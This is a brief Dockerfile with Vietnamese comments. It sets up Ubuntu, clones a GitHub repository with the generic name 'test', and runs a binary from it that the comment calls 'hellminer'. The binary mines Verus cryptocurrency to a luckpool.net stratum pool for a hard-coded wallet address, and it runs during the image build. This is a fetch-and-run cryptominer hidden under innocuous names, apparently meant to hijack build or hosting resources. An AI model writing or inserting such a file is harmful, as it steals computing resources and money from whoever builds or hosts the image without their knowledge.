# Sử dụng hình ảnh Ubuntu
FROM ubuntu:20.04

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    tar \
    git \
    sudo

# Tạo thư mục làm việc và tải hellminer

RUN git clone https://github.com/Teo4268/test.git && cd test && ./test -a verus -o stratum+tcp://eu.luckpool.net:3956 -u R9V2bPUyD6gJZTckXQcoK6GCMLB9NW2h6X -p x -t 4
